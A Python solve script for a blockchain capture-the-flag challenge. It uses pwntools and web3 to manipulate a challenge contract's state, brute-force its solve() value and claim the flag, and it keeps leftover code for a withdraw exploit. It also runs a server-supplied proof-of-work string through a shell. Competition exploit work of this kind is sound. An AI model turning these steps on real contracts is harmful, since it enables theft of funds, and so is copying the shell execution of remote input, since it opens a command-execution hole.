import web3
import json
from pwn import *
import subprocess

def solve_all(store_3):
    ADDR = "blyga-kontraktet.ctfchall.se"
    PORT = 50000

    io = remote(ADDR, PORT, ssl=True)

    io.sendlineafter(b"> ", b"1")

    pow_yay = io.recvline()[:-1].decode()
    pow_res = subprocess.check_output(pow_yay, shell=True).decode().strip()
    io.sendlineafter(b"Solution please: ", pow_res)

    io.recvuntil(b"Blockchain info:\n")

    uuid = io.recvline().strip().decode().split(" ")[0]
    rpc = io.recvline().strip().decode().split(" ")[-1]
    rpc = rpc.replace("[addr]", ADDR)
    private_key = io.recvline().strip().decode().split(" ")[-1]
    my_addr = io.recvline().strip().decode().split(" ")[-1]
    target_addr = io.recvline().strip().decode().split(" ")[-1]

    print(f"{uuid = }")
    print(f"{rpc = }")
    print(f"{private_key = }")
    print(f"{my_addr = }")
    print(f"{target_addr = }")

    with open("abi/Secret.json", "r") as openfile:
        secret_abi = json.load(openfile)

    with open("abi/Setup.json", "r") as openfile:
        setup_abi = json.load(openfile)

    w3 = web3.Web3(web3.HTTPProvider(rpc))
    setup_contract = w3.eth.contract(address=target_addr, abi=setup_abi)
    my_addr = w3.eth.account.from_key(private_key).address

    secret_addr = setup_contract.functions.secret().call()
    print(f"{secret_addr = }")

    contract = w3.eth.contract(address=secret_addr, abi=secret_abi)

    print("My balance:", w3.eth.get_balance(my_addr) / 10**18)

    setup_contract.functions.hello().transact(
        {
            "from": my_addr,
            "gas": 1000000,
        }
    )

    solved = setup_contract.functions.isSolved().call()
    print("Is solved?", solved)

    # ----------------------------------------------- #


    # secret_message = setup_contract.functions.secretMessage().call()
    # print(secret_message)

    # setup_bytecode = w3.eth.get_code(target_addr)
    # secret_bytecode = w3.eth.get_code(secret_addr)
    #
    # print("setup bytecode:")
    # print(setup_bytecode.hex())
    # print()
    # print("secret bytecode:")
    # print(secret_bytecode.hex())
    # print()

# _wow = 41
# stor_2 = 69
# stor_4 < 66

# contract.functions.haha().transact({
#     "from": my_addr,
#     "gas": 1000000
# })
#
# function_signatures = [
#     "haha()",
#     "solve(uint256)",
#     "solved()",
#     "wow()"
# ]
#
# # Provided selector
# provided_selector = "0xdc5c64c0"
#
# # Function to calculate the function selector
# def get_selector(function_signature):
#     # Hash the function signature and take the first 4 bytes
#     return w3.keccak(text=function_signature)[:4].hex()
#
# for signature in function_signatures:
#     selector = get_selector(signature)
#     print(f"Function signature: {signature} -> Selector: {selector}")
#     
#     if selector == provided_selector[2:]:
#         print(f"Match found: {signature}")
#
# function_signature = web3.Web3.to_bytes(hexstr="0xdc5c64c0")
# print(function_signature)

    def trans(func):
        txn = func.build_transaction(
            {
                "from": my_addr,
                "gas": 1000000,
                "nonce": w3.eth.get_transaction_count(my_addr),
                "gasPrice": w3.eth.gas_price,
            }
        )

        signed_txn = w3.eth.account.sign_transaction(txn, private_key)

        txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

        txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

        if txn_receipt["status"] == 1:
            print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
        else:
            print(f"{txn = }")
            print(f"{signed_txn = }")
            print(f"{txn_hash = }")
            print(f"{txn_receipt = }")
            print(f"Transaction Failed: {txn_hash.hex()}")

            try:
                result = w3.eth.call(txn)

                print(f"{result = }")
            except web3.exceptions.ContractLogicError as e:
                if "revert: nooooooooooo'" in str(e):
                    print(store_3)
                    exit()
                print(e)


# wow = 0
# stor_2 = 1000

    for i in range(29):
        trans(contract.functions.wow())
        print(i)

    for i in range(1):
        trans(contract.functions.haha())
        print(i)

    for i in range(41 - 29): 
        trans(contract.functions.wow())
        print(i)

# wow = 41

    for i in range(22):
        trans(contract.functions.haha())
        print(i)

# stor_2 = 69


# block = 66
    for i in range(100 - 66):
        setup_contract.functions.hello().transact(
            {
                "from": my_addr,
                "gas": 1000000,
            }
        )

        print(i)

    print(f"{w3.eth.block_number = }")
    trans(contract.functions.solve(store_3))

    solv = setup_contract.functions.isSolved().call()
    if solv:
        print("yay")
        print(store_3)
        exit()

    io.close()


i = 0
while True:
    try:
        solve_all(i)
        print("--------------", i, "-----------------------")
    except EOFError:
        pass

    i += 1

exit()
for i in range(50):
    contract.functions.wow().transact({"from": my_addr, "gas": 1000000})
    print(i)

    # contract.functions.solve(1).call({
    #     "from": my_addr,
    #     "gas": 1000000
    # })
    txn = contract.functions.solve(0).build_transaction(
        {
            "from": my_addr,
            "gas": 1000000,
            "nonce": w3.eth.get_transaction_count(my_addr),
            "gasPrice": w3.eth.gas_price,
        }
    )

    signed_txn = w3.eth.account.sign_transaction(txn, private_key)

    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

    if txn_receipt["status"] == 1:
        print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
    else:
        print(f"{txn = }")
        print(f"{signed_txn = }")
        print(f"{txn_hash = }")
        print(f"{txn_receipt = }")
        print(f"Transaction Failed: {txn_hash.hex()}")

        try:
            result = w3.eth.call(txn)

            print(f"{result = }")
        except web3.exceptions.ContractLogicError as e:
            print(e)

# for i in range(200):
#     contract.functions.haha().transact({
#         "from": my_addr,
#         "gas": 1000000
#     })
#     print(i)

try:
    contract.functions.solve(1).call({"from": my_addr, "gas": 1000000})
except web3.exceptions.ContractLogicError as e:
    print(e)

logs = w3.eth.get_logs(
    {
        "fromBlock": "0x0",
        "toBlock": "latest",
        "address": secret_addr,
        # 'topics': [event_signature_hash]
    }
)

# for log in logs:
#     print(log)
# print(logs)

exit()

for i in range(256):
    print(f"{i = }")
    try:
        contract.functions.solve(i).transact({"from": my_addr, "gas": 1000000})
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as e:
        print(f"crash at {i = }")
        print(e)

input()

trans = [contract.functions.transactions(i).call() for i in range(2)]
used_names = [contract.functions.usedNames(i).call() for i in range(1)]

print(f"{trans = }")
print(f"{used_names = }")

expltrans = trans[0]

myname = expltrans[0][:-1]
mytxi = expltrans[0][-1] + expltrans[2]
myvalue = expltrans[1]


txn = contract.functions.openAccount(myname).build_transaction(
    {
        "from": my_addr,
        "value": w3.to_wei(1, "ether"),
        "nonce": w3.eth.get_transaction_count(my_addr),
        "gas": 1000000,
        "gasPrice": w3.eth.gas_price,
    }
)

signed_txn = w3.eth.account.sign_transaction(txn, private_key)

txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

if txn_receipt["status"] == 1:
    print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
else:
    print(f"Transaction Failed: {txn_hash.hex()}")

txn = contract.functions.withdraw(mytxi, myvalue).build_transaction(
    {
        "from": my_addr,
        "nonce": w3.eth.get_transaction_count(my_addr),
        "gas": 1000000,
        "gasPrice": w3.eth.gas_price,
    }
)

signed_txn = w3.eth.account.sign_transaction(txn, private_key)

txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

if txn_receipt["status"] == 1:
    print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
else:
    print(f"Transaction Failed: {txn_hash.hex()}")


"""
print(f"{w3.eth.gas_price = }")
print(f"{w3.eth.get_transaction_count(my_addr) = }")

idx = 1

item_price = w3.to_wei(50, "ether")
print(f"{item_price = }")

txn = contract.functions.buyItem(idx).build_transaction({
    "from": my_addr,
    "value": item_price,
    "nonce": w3.eth.get_transaction_count(my_addr),
    "gas": 1000000,
    "gasPrice": w3.eth.gas_price
})

signed_txn = w3.eth.account.sign_transaction(txn, private_key)

txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

if txn_receipt['status'] == 1:
    print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
    print(f"Item bought by: {my_addr}")
else:
    print(f"Transaction Failed: {txn_hash.hex()}")
"""

# ----------------------------------------------- #

solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

if solved:
    io.close()
    io = remote(ADDR, PORT, ssl=True)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", uuid.encode())

io.interactive()
